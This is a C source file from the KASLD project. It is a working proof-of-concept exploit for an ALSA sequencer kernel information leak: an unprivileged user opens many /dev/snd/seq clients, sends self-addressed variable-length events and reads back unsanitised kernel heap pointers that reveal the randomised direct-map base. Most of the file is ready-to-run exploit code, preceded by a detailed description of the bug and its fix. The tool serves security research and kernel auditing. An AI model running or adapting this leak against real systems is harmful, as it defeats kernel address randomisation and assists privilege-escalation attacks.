// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak a kernel direct-map address from the ALSA sequencer variable-length
// event header (unsanitised `data.ext.ptr` returned by snd_seq_read()).
//
// When a variable-length (SNDRV_SEQ_EVENT_LENGTH_VARIABLE) sequencer event is
// queued, snd_seq_event_dup() (sound/core/seq/seq_memory.c) chains the payload
// into cells taken from the client's kvmalloc'd event pool and sets
// `cell->event.data.ext.ptr` to the first chained cell — a kernel heap pointer.
// snd_seq_read() (sound/core/seq/seq_clientmgr.c) copies that event header to
// userspace; before the fix it stripped only the length flags and left
// `data.ext.ptr` set, so an unprivileged /dev/snd/seq client that writes a
// variable event to itself and reads it back recovers the raw pool-cell
// address. The default event pools are small (200/500 cells, ~13-32 KiB), so
// the pointer is kmalloc'd into the linear map — a direct-map VA.
//
// The leak was found and fixed by Kyle Zeng <kylebot@openai.com>:
//   705dd6dcbc0e ("ALSA: seq: Clear variable event pointer on read").
// The fix adds a single line, `tmpev.data.ext.ptr = NULL;`, before the
// copy_to_user() in snd_seq_read().
//
//   Data leaked:      a struct snd_seq_event_cell * (kvmalloc pool cell,
//                     direct-map VA)
//   Kernel subsystem: sound/core/seq — snd_seq_read() variable-event header
//   Address type:     virtual (direct map / linear region)
//   Method:           parsed (data.ext.ptr field of the read-back event)
//   Privilege:        unprivileged — /dev/snd/seq, reachable via the
//                     systemd-logind `uaccess` ACL granted to a logged-in
//                     desktop user (no `audio` group needed), or the `audio`
//                     group. kptr_restrict-INDEPENDENT: the value comes back
//                     through a raw copy_to_user(), not %pK, so it survives
//                     kptr_restrict=2.
//   Patch:            data.ext.ptr cleared on read (v7.2, commit 705dd6dcbc0e).
//                     Present since 2.6.12 (Fixes: 1da177e4c3f4), i.e. every
//                     pre-fix kernel across all current LTS lines.
//
// This is a live host probe: it drives the running kernel's sequencer and the
// leaked address is this machine's, not reproducible from a captured tree. It
// emits ONLY when the read-back pointer lands in this arch's direct-map window
// (kasld_addr_is_directmap): on a patched kernel (data.ext.ptr == NULL), a
// coupled arch whose direct-map window is empty, or a small-lowmem/fragmented
// arch where kvmalloc falls back to vmalloc (the leaked cell is then a vmalloc
// address, not direct-map — observed on arm32), it is a silent no-op rather
// than mislabelling a non-direct-map pointer — sound by construction.
//
// Engine fit: emitted as a VIRT REGION_DIRECTMAP interior sample. Every
// kvmalloc/kmalloc object lives in the linear map, so the address bounds
// Q_PAGE_OFFSET from above (directmap_page_offset_bounds). Useful on x86_64
// where the direct map is randomized (CONFIG_RANDOMIZE_MEMORY); a no-op where
// PAGE_OFFSET is fixed. Arch-independent (the value is a kernel heap VA on any
// architecture).
//
// Mitigations:
//   Patched by clearing data.ext.ptr on read (v7.2). Otherwise the only gate is
//   access to /dev/snd/seq (device ACL / `audio` group); no sysctl restricts
//   it, and kptr_restrict does not apply.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"

#include <errno.h>
#include <fcntl.h>
#include <stddef.h> /* offsetof */
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* Self-contained ALSA sequencer ABI. Rather than depend on
 * <sound/asequencer.h> being present in every (musl) cross sysroot, the two
 * structures touched and the two ioctl request numbers are replicated here and
 * checked against the kernel UAPI with _Static_assert below. Values verified
 * against include/uapi/sound/asequencer.h. */

typedef struct {
  unsigned char client;
  unsigned char port;
} kasld_seq_addr;

/* struct snd_seq_event — 28 bytes; the ext view carries the leaked pointer.
 * data.ext is __packed in the UAPI, so data.ext.ptr sits at byte offset 20
 * (unaligned); accessing it through the packed member is correct on every
 * architecture. */
typedef struct {
  unsigned char type;
  unsigned char flags;
  char tag;
  unsigned char queue;
  unsigned char time[8]; /* union snd_seq_timestamp */
  kasld_seq_addr source;
  kasld_seq_addr dest;
  union {
    unsigned char raw8[12];
    struct {
      unsigned int len;
      void *ptr;
    } __attribute__((packed)) ext;
  } data;
} kasld_seq_event;

/* struct snd_seq_port_info — 168 bytes (only used to create a port). */
typedef struct {
  kasld_seq_addr addr;
  char name[64];
  unsigned int capability;
  unsigned int type;
  int midi_channels;
  int midi_voices;
  int synth_voices;
  int read_use;
  int write_use;
  void *kernel;
  unsigned int flags;
  unsigned char time_queue;
  unsigned char direction;
  unsigned char ump_group;
  char reserved[57];
} kasld_seq_port_info;

/* snd_seq_event carries no pointer outside the packed ext union, so its size
 * and the leaked field's offset are the same on every ABI (verified: 28 bytes,
 * data.ext.ptr at 20, data.ext.len at 16). snd_seq_port_info holds a `void
 * *kernel`, so its total size is 168 on LP64 / 164 on ILP32 — do not assert a
 * fixed size; the ioctl number below derives it from sizeof per-arch. */
_Static_assert(sizeof(kasld_seq_event) == 28, "snd_seq_event must be 28 bytes");
_Static_assert(offsetof(kasld_seq_event, data.ext.ptr) == 20,
               "data.ext.ptr must be at offset 20");
_Static_assert(offsetof(kasld_seq_event, data.ext.len) == 16,
               "data.ext.len must be at offset 16");

/* Request numbers are computed from the struct sizes so they are correct on
 * both 32- and 64-bit ABIs (the kernel encodes sizeof into the number).
 *   _IOR ('S', 0x01, int)                      (== 0x80045301)
 *   _IOWR('S', 0x20, struct snd_seq_port_info) (== 0xc0a85320 on LP64) */
#define KASLD_SEQ_IOCTL_CLIENT_ID _IOR('S', 0x01, int)
#define KASLD_SEQ_IOCTL_CREATE_PORT _IOWR('S', 0x20, kasld_seq_port_info)

#define KASLD_SEQ_EVENT_SYSEX 130          /* variable-length event type */
#define KASLD_SEQ_LENGTH_VARIABLE (1 << 2) /* flags: payload follows header */
#define KASLD_SEQ_QUEUE_DIRECT 253 /* immediate (unscheduled) delivery */
#define KASLD_SEQ_PORT_CAP_RW 0x63 /* READ|WRITE|SUBS_READ|SUBS_WRITE */
#define KASLD_SEQ_PORT_TYPE_APPLICATION 0x100000

#define SEQ_DEVICE "/dev/snd/seq"

/* Upper bound on concurrently-held sequencer clients used to sample the direct
 * map. The kernel caps live clients at SNDRV_SEQ_MAX_CLIENTS (192); the actual
 * batch is whatever the kernel grants before open() fails. Holding them open at
 * once (rather than reopening, which reuses the just-freed pool) is what yields
 * distinct pool addresses spread across the direct map. */
#define SEQ_MAX_CLIENTS 192

/* The _IOR/_IOWR request numbers carry direction bits (high bit set), so they
 * exceed INT_MAX; musl's POSIX-strict ioctl() takes an int request and would
 * warn (-Woverflow) on the narrowing. The bit pattern is preserved, so cast in
 * one wrapper. */
static int seq_ioctl(int fd, unsigned long req, void *arg) {
  return ioctl(fd, (int)req, arg);
}

KASLD_EXPLAIN(
    "Opens /dev/snd/seq, creates a port, and sends a variable-length (SysEx) "
    "sequencer event addressed to itself via direct dispatch, then reads it "
    "back. Before commit 705dd6dcbc0e, snd_seq_read() returned the event "
    "header with data.ext.ptr still pointing at the kvmalloc'd pool cell that "
    "holds the chained payload — a kernel direct-map address that bounds the "
    "direct-map base. Holds many clients open at once so their pools land at "
    "different direct-map addresses, and emits the lowest (tightest "
    "page_offset "
    "ceiling) and highest (interior floor witness). Unprivileged via the "
    "/dev/snd/seq device ACL and independent of kptr_restrict (raw "
    "copy_to_user, not %pK). Emits only when a real kernel pointer returns, so "
    "it is a silent no-op on a patched kernel (data.ext.ptr cleared to NULL).");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "patch:v7.2\n");

/* Perform one self-addressed variable-event round trip on an already-open
 * sequencer client `fd`. On success stores the read-back data.ext.ptr in *out
 * and returns 0 (a patched kernel returns 0 with *out == 0). Returns a negative
 * errno-style code on a setup/IO failure. The fd is NOT closed here: the caller
 * keeps clients open concurrently so their event pools are distinct live
 * kvmalloc allocations (see the batch loop in main()). */
static int seq_leak_on_fd(int fd, unsigned long *out) {
  *out = 0;

  int myclient = -1;
  if (seq_ioctl(fd, KASLD_SEQ_IOCTL_CLIENT_ID, &myclient) < 0 || myclient < 0)
    return -errno;

  kasld_seq_port_info pinfo;
  memset(&pinfo, 0, sizeof(pinfo));
  pinfo.addr.client = (unsigned char)myclient;
  strncpy(pinfo.name, "kasld", sizeof(pinfo.name) - 1);
  pinfo.capability = KASLD_SEQ_PORT_CAP_RW;
  pinfo.type = KASLD_SEQ_PORT_TYPE_APPLICATION;
  if (seq_ioctl(fd, KASLD_SEQ_IOCTL_CREATE_PORT, &pinfo) < 0)
    return -errno;
  unsigned char myport = pinfo.addr.port;

  /* Write buffer: a 28-byte variable event header immediately followed by its
   * payload (snd_seq_write() reads the payload from just after the header). */
  unsigned char payload[16];
  memset(payload, 0x41, sizeof(payload));
  payload[sizeof(payload) - 1] = 0xf7; /* SysEx end marker (cosmetic) */

  unsigned char wbuf[sizeof(kasld_seq_event) + sizeof(payload)];
  memset(wbuf, 0, sizeof(wbuf));
  kasld_seq_event *ev = (kasld_seq_event *)wbuf;
  ev->type = KASLD_SEQ_EVENT_SYSEX;
  ev->flags = KASLD_SEQ_LENGTH_VARIABLE;
  ev->queue = KASLD_SEQ_QUEUE_DIRECT;
  ev->source.client = (unsigned char)myclient;
  ev->source.port = myport;
  ev->dest.client = (unsigned char)myclient;
  ev->dest.port = myport;
  ev->data.ext.len = sizeof(payload);
  ev->data.ext.ptr = NULL; /* kernel overrides to point at the payload */
  memcpy(wbuf + sizeof(kasld_seq_event), payload, sizeof(payload));

  if (write(fd, wbuf, sizeof(wbuf)) != (ssize_t)sizeof(wbuf))
    return -errno;

  /* Read the event back. The variable payload is expanded after the header, so
   * allow room for it; only the header's data.ext.ptr is of interest. */
  unsigned char rbuf[256];
  memset(rbuf, 0, sizeof(rbuf));
  ssize_t r = read(fd, rbuf, sizeof(rbuf));
  if (r < (ssize_t)sizeof(kasld_seq_event))
    return (r < 0) ? -errno : -EPROTO;

  kasld_seq_event *rev = (kasld_seq_event *)rbuf;
  *out = (unsigned long)(uintptr_t)rev->data.ext.ptr;
  return 0;
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);
  /* Live host probe: drives the running kernel's sequencer; the leaked address
   * is this machine's, not reproducible from a captured tree. */
  if (kasld_skip_live_probe("alsa_seq_ext_ptr"))
    return 0;

  kasld_info("probing " SEQ_DEVICE
             " for a direct-map pointer via a variable event ...");

  /* Open the first client to classify access (and to detect a patched kernel).
   * Reopening in a loop is useless: close() frees the event pool and the next
   * open() gets the same block back (LIFO), so every draw is identical. Spread
   * comes only from holding many clients open AT ONCE, so their pools are
   * distinct live kvmalloc allocations placed by the buddy allocator across the
   * direct map (measured: a ~2-7 GiB span over ~60 concurrent clients). */
  int fds[SEQ_MAX_CLIENTS];
  int nfd = 0;

  int fd0 = open(SEQ_DEVICE, O_RDWR | O_NONBLOCK);
  if (fd0 < 0) {
    int e = errno;
    if (e == ENOENT || e == ENODEV || e == ENXIO) {
      kasld_err(SEQ_DEVICE " unavailable (no ALSA sequencer)");
      return KASLD_EXIT_UNAVAILABLE;
    }
    if (e == EACCES || e == EPERM) {
      kasld_err(SEQ_DEVICE " access denied (needs the device ACL / audio "
                           "group)");
      return KASLD_EXIT_NOPERM;
    }
    kasld_err(SEQ_DEVICE " open failed (%s)", strerror(e));
    return KASLD_EXIT_UNAVAILABLE;
  }

  unsigned long addr = 0;
  int rc = seq_leak_on_fd(fd0, &addr);
  if (rc < 0) {
    kasld_err("sequencer probe failed (%s)", strerror(-rc));
    close(fd0);
    return KASLD_EXIT_UNAVAILABLE;
  }
  if (addr == 0) {
    /* The fix unconditionally NULLs data.ext.ptr, so one NULL round trip is a
     * definitive patched verdict — no need to open the batch. */
    kasld_err("data.ext.ptr came back NULL (patched: commit 705dd6dcbc0e)");
    close(fd0);
    return 0;
  }
  if (!kasld_addr_is_directmap(addr)) {
    /* The pool is kvmalloc'd: on a 64-bit host the ~KiB allocation lands in the
     * direct map, but on a small-lowmem / fragmented arch (e.g. arm32) kvmalloc
     * can fall back to vmalloc, and on coupled arches the direct-map window is
     * empty. Such an address is a real leak but not a page_offset witness, so
     * emit nothing rather than mislabel a vmalloc pointer as direct-map. */
    kasld_err("leaked pointer 0x%lx is outside the direct-map window "
              "(kvmalloc in vmalloc, or coupled arch) — nothing to emit",
              addr);
    close(fd0);
    return 0;
  }

  /* Vulnerable. Keep the first client open and open as many more concurrently
   * as the kernel allows (bounded by SNDRV_SEQ_MAX_CLIENTS and RLIMIT_NOFILE);
   * each yields a pointer into its own pool. The leaked pointer is an interior
   * direct-map address, so it bounds page_offset from above: the LOWEST across
   * the batch is the tightest ceiling and the HIGHEST is the best interior
   * floor witness. Both are always sound (page_offset <= any sample). */
  fds[nfd++] = fd0;
  unsigned long lo = addr, hi = addr;
  int hits = 1;
  while (nfd < SEQ_MAX_CLIENTS) {
    int fd = open(SEQ_DEVICE, O_RDWR | O_NONBLOCK);
    if (fd < 0)
      break; /* client/fd limit reached — enough samples held */
    fds[nfd++] = fd;
    unsigned long a = 0;
    if (seq_leak_on_fd(fd, &a) < 0 || a == 0 || !kasld_addr_is_directmap(a))
      continue;
    hits++;
    if (a < lo)
      lo = a;
    if (a > hi)
      hi = a;
  }

  for (int i = 0; i < nfd; i++)
    close(fds[i]);

  kasld_found("leaked %d direct-map pool-cell pointer(s) from %d concurrent "
              "clients; lowest 0x%lx highest 0x%lx",
              hits, nfd, lo, hi);

  /* Lowest = tightest page_offset ceiling; highest = interior floor witness. */
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, lo, NULL, CONF_PARSED);
  if (hi != lo)
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_DIRECTMAP, hi, NULL,
                        CONF_PARSED);
  return 0;
}
